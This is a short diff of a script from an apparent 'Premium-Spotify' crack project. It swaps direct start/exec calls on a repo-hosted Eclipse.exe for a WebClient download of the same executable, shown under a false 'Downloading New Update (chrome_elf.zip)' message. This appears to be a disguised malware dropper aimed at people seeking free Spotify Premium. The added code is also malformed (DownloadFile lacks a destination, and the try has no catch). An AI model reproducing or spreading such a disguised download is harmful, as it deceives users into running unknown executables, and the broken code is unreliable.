@@ -242,10 +242,13 @@ cls
 
 start https://github.com/CodingByLune
 
-start 'https://github.com/CodingByLune/Premium-Spotify/blob/main/ressource/src/Eclipse.exe'
-
-exec 'https://github.com/CodingByLune/Premium-Spotify/blob/main/ressource/src/Eclipse.exe'
-
+Write-Host 'Downloading New Update (chrome_elf.zip)...'`n
+$webClient = New-Object -TypeName System.Net.WebClient
+try {
+  $webClient.DownloadFile(
+    'https://github.com/CodingByLune/Premium-Spotify/blob/main/ressource/src/Eclipse.exe'
+  )
+}
 pause
 
 write-host @'
